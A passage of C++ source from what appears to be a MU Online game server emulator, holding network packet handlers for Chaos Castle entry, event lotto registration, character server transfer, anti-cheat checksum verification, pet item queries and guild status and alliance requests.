		g_ChaosCastle.LeaveUserChaosCastle(iENTER_LEVEL, iIndex);
		pResult.Result = 5;
		DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if(gObj[iIndex].pInventory[btGuardMailSetItemPos].m_Type == ITEMGET(13,29))
	{
		gObjInventoryDeleteItem(iIndex, btGuardMailSetItemPos);
		GCInventoryItemDeleteSend(iIndex, btGuardMailSetItemPos, 1);
	}else
	{
		if(gObj[iIndex].pInventory[btGuardMailSetItemPos].m_Durability == 0)
		{
			gObjInventoryDeleteItem(iIndex, btGuardMailSetItemPos);
			GCInventoryItemDeleteSend(iIndex, btGuardMailSetItemPos, 1);
		}else
		{
			int iRet = gObj[iIndex].pInventory[btGuardMailSetItemPos].SimpleDurabilityDown(1);

			if(iRet != 0)
			{				
				GCItemDurSend(iIndex,btGuardMailSetItemPos,gObj[iIndex].pInventory[btGuardMailSetItemPos].m_Durability,0);
			}
		}
	}

	DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);

	gObj[iIndex].m_cChaosCastleIndex = iENTER_LEVEL;
	gObj[iIndex].m_cChaosCastleSubIndex = iBC_INDEX;
	gObj[iIndex].m_IfState.state = 0;
	gObj[iIndex].m_IfState.type = 0;
	gObj[iIndex].m_IfState.use = 0;

	if ( gObj[iIndex].m_bPShopOpen == true )
		CGPShopReqClose(iIndex);

	if ( gObj[iIndex].PartyNumber >= 0 )
	{
		PMSG_PARTYDELUSER pMsg;
		int pindex = gParty.GetIndex(gObj[iIndex].PartyNumber, iIndex, gObj[iIndex].DBNumber);

		if ( pindex >= 0 )
		{
			pMsg.Number = pindex;
			CGPartyDelUser(&pMsg, iIndex);
		}
	}

	if ( gObj[iIndex].Class == CLASS_ELF && gObj[iIndex].m_RecallMon >= 0)
	{
		GCRecallMonLife(iIndex, 60, 0);
		gObjMonsterCallKill(iIndex);
	}

	char szTemp[256];
	wsprintf(szTemp, lMsg.Get(MSGGET(4, 206)), iENTER_LEVEL+1);
	GCServerMsgStringSend(szTemp, iIndex, 1);

	switch ( iENTER_LEVEL+1 )
	{
		case 1:
			gObjMoveGate(iIndex, 82);
			break;
		case 2:
			gObjMoveGate(iIndex, 83);
			break;
		case 3:
			gObjMoveGate(iIndex, 84);
			break;
		case 4:
			gObjMoveGate(iIndex, 85);
			break;
		case 5:
			gObjMoveGate(iIndex, 86);
			break;
		case 6:
			gObjMoveGate(iIndex, 87);
			break;
		case 7:
			gObjMoveGate(iIndex, 272);
			break;
	}

	LogAddTD("[Chaos Castle] (%d) (Account:%s, Name:%s) Entered Chaos Castle (Guard Mail Set Serial:%d)",
		iENTER_LEVEL+1, gObj[iIndex].AccountID, gObj[iIndex].Name, dwITEM_SERIAL);
}




void CGRequestRepositionUserInChaosCastle(PMSG_REQ_REPOSUSER_IN_CC * lpMsg, int aIndex)
{
	if ( !gObjIsConnected(aIndex) )
		return;

	if ( !CC_MAP_RANGE(gObj[aIndex].MapNumber) )
		return;

	if ( g_ChaosCastle.ObjSetPosition(aIndex, gObj[aIndex].X, gObj[aIndex].Y) == TRUE )
		gObj[aIndex].m_iChaosCastleBlowTime = GetTickCount();
}





void CGRequestEventEnterCount(PMSG_REQ_CL_ENTERCOUNT* lpMsg, int aIndex)
{
	if ( !lpMsg )
		return;

	switch ( lpMsg->btEventType )
	{
		case 0x02:
			{
				if(ReadConfig.SCFRSON == FALSE)
				{
					EGReqBloodCastleEnterCount(aIndex);
				}else
				{
					BC_EGReqBloodCastleEnterCount(aIndex);
				}
			}break;
		case 0x03:
			{	
				unsigned char SendData[5] = {0};
				SendData[0] = 0xC1;
				SendData[1] = 0x05;
				SendData[2] = 0x9F;
				SendData[3] = 0x03;
				SendData[4] = 0x00;
				DataSend(aIndex, SendData, 5);
			}break;
	}
}

struct PMSG_REQ_2ANIV_SERIAL
{
	PBMSG_HEAD h;	// C1:08
	int iINDEX;	// 8
	char szUID[MAX_ACCOUNT_LEN+1];	// 8
	char SERIAL1[5];	// 13
	char SERIAL2[5];	// 18
	char SERIAL3[5];	// 1D
	int iMEMB_GUID;	// 24
};


void CGRequestLottoRegister(PMSG_REQ_2ANV_LOTTO_EVENT* lpMsg, int aIndex)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	PMSG_REQ_2ANIV_SERIAL pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x08, sizeof(pMsg));

	if ( gObj[aIndex].UseEventServer )
		return;

	gObj[aIndex].UseEventServer = true;
	pMsg.iINDEX = aIndex;
	pMsg.iMEMB_GUID = gObj[aIndex].DBNumber;
	memcpy(pMsg.szUID, gObj[aIndex].AccountID, MAX_ACCOUNT_LEN);
	pMsg.szUID[MAX_ACCOUNT_LEN] = 0;
	memcpy(pMsg.SERIAL1, lpMsg->SERIAL1, 4);
	pMsg.SERIAL1[4] = 0;
	memcpy(pMsg.SERIAL2, lpMsg->SERIAL2, 4);
	pMsg.SERIAL2[4] = 0;
	memcpy(pMsg.SERIAL3, lpMsg->SERIAL3, 4);
	pMsg.SERIAL3[4] = 0;

	DataSendEventChip((PCHAR)&pMsg, sizeof(pMsg));

	LogAddTD("[Mu_2Anv_Event] [%s][%s] Register Lotto Number (Serial: %s-%s-%s)",
		gObj[aIndex].AccountID, gObj[aIndex].Name, pMsg.SERIAL1, pMsg.SERIAL2, pMsg.SERIAL3);
}


struct SDHP_CHARACTER_TRANSFER
{
	PBMSG_HEAD h;	// C1:CF
	char Account[10];	// 3
	short Number;	// E
};



void CGReqMoveOtherServer(PMSG_REQ_MOVE_OTHERSERVER * lpMsg, int aIndex)
{
	if ( !gEnableServerDivision )
		return;

	if ( !gObjIsConnectedGP(aIndex))
	{
		LogAddC(2, "error-L3 [%s][%d]", __FILE__, __LINE__);
		return;
	}

	LPOBJ lpObj = &gObj[aIndex];

	if ( lpObj->m_MoveOtherServer )
		return;

	lpObj->m_MoveOtherServer = true;

	PMSG_DEFRESULT pResult;
	PHeadSetB((LPBYTE)&pResult, 0x99, sizeof(pResult));
	
	/*if ( !gObjJoominCheck(aIndex, lpMsg->LastJoominNumber))
	{
		pResult.result = 0;

		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		lpObj->m_MoveOtherServer = false;

		LogAddTD("[CharTrasfer] Fail (JoominNumber) [%s][%s]",
			lpObj->AccountID, lpObj->Name);

		GCServerMsgStringSend("πÆ¡¶ πﬂª˝Ω√ change@webzen.co.kr∑Œ πÆ¿««ÿ ¡÷Ω√±‚πŸ∂¯¥œ¥Ÿ", lpObj->m_Index, 1);

		return;
	}*/

	SDHP_CHARACTER_TRANSFER pCharTransfer;

	GJSetCharacterInfo(lpObj, lpObj->m_Index, FALSE);
	PHeadSetB((LPBYTE)&pCharTransfer, 0xCF, sizeof(pCharTransfer));
	pCharTransfer.Number = aIndex;
	memcpy(pCharTransfer.Account, lpObj->AccountID, sizeof(pCharTransfer.Account));

	cDBSMng.Send((PCHAR)&pCharTransfer, sizeof(pCharTransfer));

	LogAddTD("[CharTrasfer] Request Character Trasfer [%s][%s]",
		lpObj->AccountID, lpObj->Name);
}




void GCPacketCheckSumRecv(PMSG_PACKETCHECKSUM * aRecv, int aIndex)
{
	gPacketCheckSum.AddCheckSum(aIndex, aRecv->funcindex, aRecv->CheckSum);
}




void GCNPggSendCheckSum(int aIndex, _GG_AUTH_DATA * pggAuthData)
{
	PMSG_NPROTECTGGCHECKSUM pMsg;

	PHeadSetBE((LPBYTE)&pMsg, 0x73, sizeof(pMsg));
	memcpy(&pMsg.m_ggadCheckSum, pggAuthData, sizeof(pMsg.m_ggadCheckSum));

	DataSend(aIndex, (LPBYTE)&pMsg, sizeof(pMsg));
}




void GCNPggCheckSumRecv(PMSG_NPROTECTGGCHECKSUM * lpMsg, int aIndex)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	LPOBJ lpObj = &gObj[aIndex];

	if ( !gObjIsConnected(aIndex))
		return;

	LogAddTD("[NPgg] Recv Checksum = %x,AuthValue = %x [%s][%s]",
		lpMsg->m_ggadCheckSum.dwIndex, lpObj->NPggCSAuth.m_AuthAnswer.dwIndex,
		lpObj->AccountID, lpObj->Name);

	memcpy(&gObj[aIndex].NPggCSAuth.m_AuthAnswer, &lpMsg->m_ggadCheckSum, sizeof(lpObj->NPggCSAuth.m_AuthAnswer));

	DWORD dwGGErrCode = gObj[aIndex].NPggCSAuth.CheckAuthAnswer();

	if ( dwGGErrCode )
	{
		LogAddTD("[NPgg] Invalid Checksum Detect Checksum = %x,AuthValue = %x [%s][%s]",
			lpMsg->m_ggadCheckSum.dwIndex, lpObj->NPggCSAuth.m_AuthAnswer.dwIndex,
			lpObj->AccountID, lpObj->Name);

		GCServerMsgStringSend(lMsg.Get(MSGGET(4, 177)), aIndex, 0);
		GCServerMsgStringSend(lMsg.Get(MSGGET(4, 178)), aIndex, 0);
		GCServerMsgStringSend(lMsg.Get(MSGGET(4, 179)), aIndex, 0);

		CloseClient(aIndex);

		return;
	}

	lpObj->m_NPggCheckSumSendTime = GetTickCount();
	lpObj->m_bSentGGAuth = false;

	LogAddTD("[NPgg] Checksum Clear %x [%s][%s]",
		lpMsg->m_ggadCheckSum.dwIndex, lpObj->AccountID, lpObj->Name);
}


struct PMSG_GETITEMINFO_FOR_PARTY
{
	PBMSG_HEAD h;	// C1:47
	BYTE NumberH;	// 3
	BYTE NumberL;	// 4
	UINT ItemInfo;	// 8
	BYTE Level;	// C
};


void GCSendGetItemInfoForParty(int aIndex, CMapItem * lpItem)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	LPOBJ lpObj = &gObj[aIndex];

	if ( lpObj->PartyNumber >= 0)
	{
		PMSG_GETITEMINFO_FOR_PARTY pMsg;

		pMsg.h.c = 0xC1;
		pMsg.h.headcode = 0x47;
		pMsg.h.size = sizeof(pMsg);
		pMsg.NumberH = SET_NUMBERH(aIndex);
		pMsg.NumberL = SET_NUMBERL(aIndex);
		pMsg.ItemInfo = lpItem->m_Type & (ITEMGET(MAX_TYPE_ITEMS-1, MAX_SUBTYPE_ITEMS-1));

		if ( lpItem->m_SkillOption )
			pMsg.ItemInfo |= 0x2000;

		if ( lpItem->m_LuckOption )
			pMsg.ItemInfo |= 0x4000;

		if ( lpItem->m_Z28Option )
			pMsg.ItemInfo |= 0x8000;

		if ( lpItem->m_NewOption )
			pMsg.ItemInfo |= 0x10000;

		if ( lpItem->m_SetOption )
			pMsg.ItemInfo |= 0x20000;

		if ( g_kItemSystemFor380.Is380OptionItem( (lpItem != NULL)?((CItem *)&lpItem->m_Number):NULL) == TRUE )
			pMsg.ItemInfo |= 0x40000;

		pMsg.Level = lpItem->m_Level;
		
		int partycount = gParty.GetPartyCount(lpObj->PartyNumber);

		if ( partycount >= 0 )
		{
			for ( int n=0;n<MAX_USER_IN_PARTY;n++)
			{
				int number = gParty.m_PartyS[lpObj->PartyNumber].Number[n];

				if ( number >= 0 )
				{
					DataSend(number, (LPBYTE)&pMsg, pMsg.h.size);
				}
			}
		}
	}
}



struct PMSG_EFFECTINFO
{
	PBMSG_HEAD h;	// C1:48
	BYTE NumberH;	// 3
	BYTE NumberL;	// 4
	BYTE btType;	// 5
};


void GCSendEffectInfo(int aIndex, BYTE btType)
{
	if ( OBJMAX_RANGE(aIndex) == FALSE )
	{
		return;
	}

	LPOBJ lpObj = &gObj[aIndex];
	PMSG_EFFECTINFO pMsg;

	pMsg.h.c = 0xC1;
	pMsg.h.headcode = 0x48;
	pMsg.h.size = sizeof(pMsg);
	pMsg.NumberH = SET_NUMBERH(aIndex);
	pMsg.NumberL = SET_NUMBERL(aIndex);
	pMsg.btType = btType;

	if ( btType == 17 )
	{
		DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
	}

	MsgSendV2(lpObj, (LPBYTE)&pMsg, pMsg.h.size);
}




void CGRequestPetItemCommand(PMSG_REQUEST_PET_ITEM_COMMAND * lpMsg, int aIndex)
{
	if ( !gObjIsConnectedGP(aIndex))
	{
		//LogAddTD("error-L2 : Index %s %d", __FILE__, __LINE__);
		return;
	}

	if ( !OBJMAX_RANGE(aIndex))
		return;

	if ( lpMsg->PetType )
		return;

	int iTargetIndex = MAKE_NUMBERW(lpMsg->NumberH, lpMsg->NumberL);
	gDarkSpirit[aIndex].ChangeCommand(lpMsg->Command, iTargetIndex);
}




void CGRequestPetItemInfo(PMSG_REQUEST_PET_ITEMINFO * lpMsg, int aIndex)
{
	if ( !gObjIsConnectedGP(aIndex))
	{
		//LogAddTD("error-L2 : Index %s %d", __FILE__, __LINE__);
		return;
	}

	if ( !OBJMAX_RANGE(aIndex))
		return;

	LPOBJ lpObj = &gObj[aIndex];

	if ( lpMsg->PetType != 0 && lpMsg->PetType != 1 )
		return;
	
	PMSG_SEND_PET_ITEMINFO pMsg;

	pMsg.h.set((LPBYTE)&pMsg, 0xA9, sizeof(pMsg));
	pMsg.PetType = lpMsg->PetType;
	pMsg.InvenType = lpMsg->InvenType;
	pMsg.nPos = lpMsg->nPos;

	if ( lpMsg->InvenType == 0 )	// Inventory
	{
		if ( !ReadConfig.INVENTORY_RANGE(aIndex,lpMsg->nPos,false))
		{
			LogAddTD("[PetItem] [%s][%s] RequestPetItem Invalid Iventory nPos %d",
				lpObj->AccountID, lpObj->Name, lpMsg->nPos);

			return;
		}

		if ( lpObj->pInventory[lpMsg->nPos].IsItem() )
		{
			pMsg.Exp = lpObj->pInventory[lpMsg->nPos].m_PetItem_Exp;
			pMsg.Level = lpObj->pInventory[lpMsg->nPos].m_PetItem_Level;

			DataSend(aIndex, (LPBYTE)&pMsg, sizeof(pMsg));
		}
	}
	else if ( lpMsg->InvenType == 1 )	// Warehouse
	{
		if ( lpObj->LoadWareHouseInfo != false )
		{
			if ( !ReadConfig.WAREHOUSE_RANGE(aIndex,lpMsg->nPos,false))
			{
				LogAddTD("[PetItem] [%s][%s] RequestPetItem Invalid WareHouse nPos %d",
					lpObj->AccountID, lpObj->Name, lpMsg->nPos);

				return;
			}

			if ( lpObj->pWarehouse[lpMsg->nPos].IsItem() )
			{
				pMsg.Exp = lpObj->pWarehouse[lpMsg->nPos].m_PetItem_Exp;
				pMsg.Level = lpObj->pWarehouse[lpMsg->nPos].m_PetItem_Level;

				DataSend(aIndex, (LPBYTE)&pMsg, sizeof(pMsg));
			}
		}
	}
	else if ( lpMsg->InvenType == 2 )	// Trade
	{
		if ( lpObj->m_IfState.use < 1 || lpObj->m_IfState.type != 1 )
			return;

		if ( !TRADE_BOX_RANGE(lpMsg->nPos))
		{
			LogAddTD("[PetItem] [%s][%s] RequestPetItem Invalid Trade nPos %d",
				lpObj->AccountID, lpObj->Name, lpMsg->nPos);

			return;
		}

		if ( lpObj->Trade[lpMsg->nPos].IsItem() )
		{
			pMsg.Exp = lpObj->Trade[lpMsg->nPos].m_PetItem_Exp;
			pMsg.Level = lpObj->Trade[lpMsg->nPos].m_PetItem_Level;

			DataSend(aIndex, (LPBYTE)&pMsg, sizeof(pMsg));
		}
	}
	else if ( lpMsg->InvenType == 3 )	// Target Trade
	{
		if ( lpObj->m_IfState.use < 1 || lpObj->m_IfState.type != 1 )
			return;

		int iTargetIndex = gObj[aIndex].TargetNumber;

		if ( iTargetIndex < 0 )
			return;

		if ( !OBJMAX_RANGE(iTargetIndex) )
			return;

		if ( gObj[iTargetIndex].m_IfState.use < 1 || gObj[iTargetIndex].m_IfState.type != 1 )
			return;

		if ( !TRADE_BOX_RANGE(lpMsg->nPos))
		{
			LogAddTD("[PetItem] [%s][%s] RequestPetItem Invalid TargetTrade nPos %d",
				lpObj->AccountID, lpObj->Name, lpMsg->nPos);

			return;
		}

		if ( gObj[iTargetIndex].Trade[lpMsg->nPos].IsItem() )
		{
			pMsg.Exp = gObj[iTargetIndex].Trade[lpMsg->nPos].m_PetItem_Exp;
			pMsg.Level = gObj[iTargetIndex].Trade[lpMsg->nPos].m_PetItem_Level;

			DataSend(aIndex, (LPBYTE)&pMsg, sizeof(pMsg));
		}
	}
	else if ( lpMsg->InvenType == 4 )	// Chaos
	{
		if ( !CHAOS_BOX_RANGE(lpMsg->nPos) )
		{
			LogAddTD("[PetItem] [%s][%s] RequestPetItem Invalid Chaos nPos %d",
				lpObj->AccountID, lpObj->Name, lpMsg->nPos);

			return;
		}

		if ( lpObj->pChaosBox[lpMsg->nPos].IsItem() )
		{
			pMsg.Exp = lpObj->pChaosBox[lpMsg->nPos].m_PetItem_Exp;
			pMsg.Level = lpObj->pChaosBox[lpMsg->nPos].m_PetItem_Level;

			DataSend(aIndex, (LPBYTE)&pMsg, sizeof(pMsg));
		}
	}
	else if ( lpMsg->InvenType == 5 )	// Personal Shop
	{
		if ( !ReadConfig.INVENTORY_RANGE(aIndex,lpMsg->nPos,false ))
		{
			LogAddTD("[PetItem] [%s][%s] RequestPetItem Invalid Iventory nPos %d",
				lpObj->AccountID, lpObj->Name, lpMsg->nPos);

			return;
		}

		if ( lpObj->m_iPShopDealerIndex != -1 )
		{
			if ( OBJMAX_RANGE(lpObj->m_iPShopDealerIndex))
			{
				if ( gObj[lpObj->m_iPShopDealerIndex].pInventory[lpMsg->nPos].IsItem() )
				{
					pMsg.Exp = gObj[lpObj->m_iPShopDealerIndex].pInventory[lpMsg->nPos].m_PetItem_Exp;
					pMsg.Level = gObj[lpObj->m_iPShopDealerIndex].pInventory[lpMsg->nPos].m_PetItem_Level;

					DataSend(aIndex, (LPBYTE)&pMsg, sizeof(pMsg));
				}
			}
		}
	}	
}







struct PMSG_ANS_GUILDVIEWPORT
{
	PBMSG_HEAD h;	// C1:66
	int GuildNumber;	// 4
	BYTE btGuildType;	// 8
	BYTE UnionName[8];	// 9
	char GuildName[8];	// 11
	BYTE Mark[32];	// 19
};


void GCGuildViewportInfo(PMSG_REQ_GUILDVIEWPORT * aRecv, int aIndex)
{
	if ( !gObjIsConnectedGP(aIndex))
	{
		LogAddTD("error-L2 : Index %s %d", __FILE__, __LINE__);
		return;
	}

	if ( !OBJMAX_RANGE(aIndex))
		return;

	LPOBJ lpObj = &gObj[aIndex];
	DWORD dwGuildNumber = aRecv->GuildNumber;
	_GUILD_INFO_STRUCT * lpGuildInfo = Guild.SearchGuild_Number(dwGuildNumber);

	if ( lpGuildInfo )
	{
		PMSG_ANS_GUILDVIEWPORT pMsg;

		pMsg.h.c = 0xC1;
		pMsg.h.headcode = 0x66;
		pMsg.h.size = sizeof(pMsg);
		pMsg.GuildNumber = lpGuildInfo->Number;
		pMsg.btGuildType = lpGuildInfo->btGuildType;

		TUnionInfo * pUnionInfo = UnionManager.SearchUnion(lpGuildInfo->iGuildUnion);

		if ( pUnionInfo )
			memcpy(pMsg.UnionName, pUnionInfo->m_szMasterGuild, MAX_GUILD_LEN);
		else
			pMsg.UnionName[0] = '\0';

		strcpy(pMsg.GuildName, lpGuildInfo->Name);
		memcpy(pMsg.Mark, lpGuildInfo->Mark, sizeof(pMsg.Mark));

		DataSend(aIndex, (LPBYTE)&pMsg, sizeof(pMsg));
	}
	else
	{
		LogAddTD("[GCGuildViewportInfo] Error getting info Guild: [%s] Number: %d",
			lpObj->Name, dwGuildNumber);
	}
}







void CGGuildAssignStatus(PMSG_GUILD_ASSIGN_STATUS_REQ * aRecv, int aIndex)
{
	if ( !gObjIsConnectedGP(aIndex))
	{
		LogAddTD("error-L2 : Index %s %d", __FILE__, __LINE__);
		return;
	}

	if ( !OBJMAX_RANGE(aIndex))
		return;

	LPOBJ lpObj = &gObj[aIndex];
	PMSG_GUILD_ASSIGN_STATUS_RESULT pMsg={0};
	
	pMsg.h.set((LPBYTE)&pMsg, 0xE1, sizeof(pMsg));
	pMsg.btType = aRecv->btType;
	memcpy(pMsg.szTagetName, aRecv->szTagetName, sizeof(pMsg.szTagetName));

	if ( lpObj->GuildNumber <= 0 || lpObj->lpGuild == NULL )
	{
		pMsg.btResult = GUILD_ANS_NOTEXIST_GUILD;
		DataSend(aIndex, (LPBYTE)&pMsg, sizeof(pMsg));
		return;
	}

	if ( gObj[aIndex].GuildStatus != G_MASTER )
	{
		pMsg.btResult = GUILD_ANS_NOTEXIST_PERMISSION;
		DataSend(aIndex, (LPBYTE)&pMsg, sizeof(pMsg));
		return;
	}

	char szTargetName[MAX_ACCOUNT_LEN+1]={0};
	memcpy(szTargetName, aRecv->szTagetName, MAX_ACCOUNT_LEN);

	if ( !strcmp(gObj[aIndex].Name, szTargetName))
	{
		pMsg.btResult = GUILD_ANS_NOTEXIST_PERMISSION;
		DataSend(aIndex, (LPBYTE)&pMsg, sizeof(pMsg));
		return;
	}

	if ( lpObj->lpGuild == NULL )
		return;

	if ( aRecv->btType == 1 || aRecv->btType == 2 )
	{
		int iSubMasterCount = 0;
		int iBattleMasterCount = 0;

		for ( int n=0;n<MAX_USER_GUILD;n++)
		{
			if ( lpObj->lpGuild->Use[n] > 0 )
			{
				if ( lpObj->lpGuild->GuildStatus[n] == G_SUB_MASTER )
				{
					iSubMasterCount++;
				}
				else if ( lpObj->lpGuild->GuildStatus[n] == G_BATTLE_MASTER )
				{
					iBattleMasterCount++;
				}
			}
		}

		if ( aRecv->btGuildStatus == G_SUB_MASTER )
		{
			if ( iSubMasterCount == 0 )
			{
				GDGuildReqAssignStatus(aIndex, aRecv->btType, aRecv->szTagetName, aRecv->btGuildStatus);
				return;
			}

			pMsg.btResult = GUILD_ANS_NOTEXIST_EXTRA_STATUS;
			DataSend(aIndex, (LPBYTE)&pMsg, sizeof(pMsg));
			return;
		}
		else if ( aRecv->btGuildStatus == G_BATTLE_MASTER )
		{
			if ( iBattleMasterCount < ((lpObj->Level / 200 ) +1) )
			{
				GDGuildReqAssignStatus(aIndex, aRecv->btType, aRecv->szTagetName, aRecv->btGuildStatus);
				return;
			}

			pMsg.btResult = GUILD_ANS_NOTEXIST_EXTRA_STATUS;
			DataSend(aIndex, (LPBYTE)&pMsg, sizeof(pMsg));
			return;
		}
		else if ( aRecv->btGuildStatus == G_PERSON )
		{
			GDGuildReqAssignStatus(aIndex, aRecv->btType, aRecv->szTagetName, aRecv->btGuildStatus);
			return;
		}
		else
		{
			return;
		}
	}
	
	if ( aRecv->btType == 3 )
	{
		GDGuildReqAssignStatus(aIndex, aRecv->btType, aRecv->szTagetName, aRecv->btGuildStatus);
	}
}




void CGGuildAssignType(PMSG_GUILD_ASSIGN_TYPE_REQ * aRecv, int aIndex)
{
	if ( !gObjIsConnectedGP(aIndex))
	{
		LogAddTD("error-L2 : Index %s %d", __FILE__, __LINE__);
		return;
	}

	if ( !OBJMAX_RANGE(aIndex))
		return;

	LPOBJ lpObj = &gObj[aIndex];
	PMSG_GUILD_ASSIGN_TYPE_RESULT pMsg={0};
	
	pMsg.h.set((LPBYTE)&pMsg, 0xE2, sizeof(pMsg));
	pMsg.btGuildType = aRecv->btGuildType;
	
	if ( lpObj->GuildNumber <= 0 || lpObj->lpGuild == NULL )
	{
		pMsg.btResult = GUILD_ANS_NOTEXIST_GUILD;
		DataSend(aIndex, (LPBYTE)&pMsg, sizeof(pMsg));
		return;
	}

	if ( gObj[aIndex].GuildStatus != G_MASTER )
	{
		pMsg.btResult = GUILD_ANS_NOTEXIST_PERMISSION;
		DataSend(aIndex, (LPBYTE)&pMsg, sizeof(pMsg));
		return;
	}
	
	GDGuildReqAssignType(aIndex, aRecv->btGuildType);
}




void CGRelationShipReqJoinBreakOff(PMSG_RELATIONSHIP_JOIN_BREAKOFF_REQ * aRecv, int aIndex)
{
	if ( g_CastleSiegeSync.GetCastleState() >= 5 && g_CastleSiegeSync.GetCastleState() <= 7 )
	{
		LogAddTD("%s g_CastleSiegeSync.GetCastleState() Wrong State: %d",__FUNCTION__, g_CastleSiegeSync.GetCastleState());
		MsgOutput(aIndex, lMsg.Get(MSGGET(6, 196)));
		return;
	}

	int iTargetUserIndex = MAKE_NUMBERW(aRecv->btTargetUserIndexH, aRecv->btTargetUserIndexL);

	if ( !OBJMAX_RANGE(aIndex) || !OBJMAX_RANGE(iTargetUserIndex))
	{
		LogAddTD("%s !OBJMAX_RANGE(%d) || !OBJMAX_RANGE(%d)",__FUNCTION__,aIndex,iTargetUserIndex);
		return;
	}

	if ( !PacketCheckTime(&gObj[aIndex]))
	{
		LogAddTD("%s !PacketCheckTime(%d)",__FUNCTION__,aIndex);
		return;
	}

	if ( gObjIsConnected(&gObj[iTargetUserIndex]) == FALSE )
	{
		LogAddTD("%s  gObjIsConnected(&gObj[%d])",__FUNCTION__,iTargetUserIndex);
		GCResultSend(aIndex, 0x51, 3);
		return;
	}

	if ( !gObj[aIndex].lpGuild || !gObj[iTargetUserIndex].lpGuild )
	{
		LogAddTD("%s  !gObj[%d].lpGuild || !gObj[%d].lpGuild",__FUNCTION__,aIndex,iTargetUserIndex);
		GCResultSend(aIndex, 0x51, 5);
		return;
	}

	if ( gObj[aIndex].GuildStatus != G_MASTER && gObj[iTargetUserIndex].GuildStatus != G_MASTER)
	{
		LogAddTD("%s  gObj[aIndex].GuildStatus != G_MASTER && gObj[iTargetUserIndex].GuildStatus != G_MASTER",__FUNCTION__);
		GCResultSend(aIndex, 0x51, 4);
		return;
	}

	if ( gObj[aIndex].m_IfState.use > 0 )
	{
		LogAddTD("%s  gObj[aIndex].m_IfState.use > 0",__FUNCTION__);
		GCResultSend(aIndex, 0x51, 6);
		return;
	}

	if ( gObj[iTargetUserIndex].m_IfState.use > 0 )
	{
		LogAddTD("%s  gObj[iTargetUserIndex].m_IfState.use > 0",__FUNCTION__);
		GCResultSend(aIndex, 0x51, 6);
		return;
	}


	PMSG_RELATIONSHIP_JOIN_BREAKOFF_ANS ErrMsg={0};

	PHeadSetB((LPBYTE)&ErrMsg, 0xE6, sizeof(ErrMsg));
	ErrMsg.btResult = 0;
	ErrMsg.btRequestType = aRecv->btRequestType;
	ErrMsg.btRelationShipType = aRecv->btRelationShipType;
	ErrMsg.btTargetUserIndexH = aRecv->btTargetUserIndexH;
	ErrMsg.btTargetUserIndexL = aRecv->btTargetUserIndexL;

	LPOBJ lpObj = &gObj[aIndex];
	LPOBJ lpTargetObj = &gObj[iTargetUserIndex];
	
	if(Gens.Enabled == 1)
	{
		if(Gens.AllowGuildAllianceWithOtherGensFam == 0)
		{
			if ( gObj[aIndex].GensFam != gObj[iTargetUserIndex].GensFam && lpObj->GensFam != 0 && lpObj->lpGuild->GensFam != 0)
			{
				GCServerMsgStringSend("You can make Alliances only with same Gens Family", aIndex, 1);
				LogAddTD("%s  gObj[aIndex].GensFam != gObj[iTargetUserIndex].GensFam");

				ErrMsg.btResult = GUILD_ANS_CANCLE_REQUEST;
				DataSend(aIndex, (LPBYTE)&ErrMsg, ErrMsg.h.size);
				return;
			}
		}
	}

	if ( lpObj->GuildStatus != G_MASTER || lpTargetObj->GuildStatus != G_MASTER)
	{
		LogAddTD("%s  GUILD_ANS_NOTEXIST_PERMISSION;",__FUNCTION__);

		ErrMsg.btResult = GUILD_ANS_NOTEXIST_PERMISSION;
		DataSend(aIndex, (LPBYTE)&ErrMsg, ErrMsg.h.size);
		return;
	}

	_GUILD_INFO_STRUCT * lpGuildInfo = gObj[aIndex].lpGuild;
	_GUILD_INFO_STRUCT * lpTargetGuildInfo = gObj[iTargetUserIndex].lpGuild;
	BYTE btRelationShip = gObjGetRelationShip(lpObj, lpTargetObj);

	if ( aRecv->btRequestType == 1 )
	{
		if ( aRecv->btRelationShipType == 1 )
		{
			if ( lpTargetGuildInfo->Count < ReadConfig.Min_Guild_Count_For_CS )
			{
				LogAddTD("%s GUILD_ANS_CANNOT_BE_UNION_MASTER;",__FUNCTION__);

				ErrMsg.btResult = GUILD_ANS_CANNOT_BE_UNION_MASTER;
				DataSend(aIndex, (LPBYTE)&ErrMsg, ErrMsg.h.size);
				return;
			}

			if ( lpTargetGuildInfo->iGuildUnion != 0 && lpTargetGuildInfo->iGuildUnion == lpTargetGuildInfo->Number )	// #error
			{
				if ( UnionManager.GetGuildRelationShipCount(lpTargetGuildInfo->iGuildUnion, 1) >= MAX_UNION_MEMBER  )
				{
					LogAddTD("%s GUILD_ANS_EXCEED_MAX_UNION_MEMBER;",__FUNCTION__);

					ErrMsg.btResult = GUILD_ANS_EXCEED_MAX_UNION_MEMBER;
					DataSend(aIndex, (LPBYTE)&ErrMsg, ErrMsg.h.size);
					return;
				}
			}
		
			char szCastleOwnerGuildName[MAX_GUILD_LEN+1]={0};
			memcpy(szCastleOwnerGuildName, g_CastleSiegeSync.GetCastleOwnerGuild(), MAX_GUILD_LEN);

			if ( !strcmp(lpGuildInfo->Name, szCastleOwnerGuildName))
			{
				LogAddTD("%s GUILD_ANS_EXIST_UNION; 1",__FUNCTION__);

				ErrMsg.btResult = GUILD_ANS_EXIST_UNION;
				DataSend(aIndex, (LPBYTE)&ErrMsg, ErrMsg.h.size);
				return;
			}

			if ( lpGuildInfo->iGuildUnion )
			{
				LogAddTD("%s GUILD_ANS_EXIST_UNION; 2",__FUNCTION__);

				ErrMsg.btResult = GUILD_ANS_EXIST_UNION;
				DataSend(aIndex, (LPBYTE)&ErrMsg, ErrMsg.h.size);
				return;
			}

			if ( btRelationShip == 2 )
			{
				LogAddTD("%s GUILD_ANS_EXIST_RELATIONSHIP_RIVAL;",__FUNCTION__);

				ErrMsg.btResult = GUILD_ANS_EXIST_RELATIONSHIP_RIVAL;
				DataSend(aIndex, (LPBYTE)&ErrMsg, ErrMsg.h.size);
				return;
			}

			if ( lpTargetGuildInfo->iGuildUnion && lpTargetGuildInfo->Number != lpTargetGuildInfo->iGuildUnion )	// #error???
			{
				LogAddTD("%s GUIDL_ANS_NOT_UNION_MASTER;",__FUNCTION__);

				ErrMsg.btResult = GUIDL_ANS_NOT_UNION_MASTER;
